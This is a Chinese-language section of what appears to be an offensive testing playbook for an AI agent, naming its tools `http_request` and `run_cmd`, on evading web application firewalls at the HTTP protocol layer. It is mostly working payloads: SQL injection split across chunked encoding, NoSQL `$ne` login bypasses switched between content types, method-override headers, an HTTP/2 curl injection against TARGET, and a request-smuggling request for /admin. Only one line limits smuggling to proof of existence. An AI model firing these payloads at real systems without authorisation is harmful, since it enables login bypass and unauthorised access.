# HTTP 协议层绕过
## 2.1 分块传输编码（Chunked Transfer Encoding）

WAF 可能不完整解析分块请求。`http_request` 若组不出 chunked，用 `run_cmd` + `/usr/bin/curl` 发原始报文：

```http
POST /api/login HTTP/1.1
Transfer-Encoding: chunked

3
pas
5
sword
1
=
5
admin
1
'
3
 OR
3
 '1
4
'='1
0

```

## 2.2 Content-Type 切换

WAF 通常只检查特定 Content-Type 的请求体：

```
# JSON → URL 编码（如果后端都接受）
Content-Type: application/x-www-form-urlencoded
password[$ne]=&username=admin

# URL 编码 → JSON
Content-Type: application/json
{"password": {"$ne": ""}}

# 非标准 Content-Type
Content-Type: text/plain
Content-Type: application/xml
Content-Type: multipart/form-data
```

## 2.3 HTTP 方法切换

```
# WAF 可能只检查 GET/POST；试 PUT/PATCH/DELETE/OPTIONS
# 方法覆盖头
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
```

## 2.4 HTTP/2

```
# 伪头部可能不被 WAF 检查
curl --http2 "http://TARGET/?id=1' OR '1'='1"
```

## 2.5 HTTP 请求走私

前端（WAF/CDN）和后端 HTTP 解析不一致时：

```http
POST / HTTP/1.1
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
```

只做存在性证明，禁止把走私当 DoS。
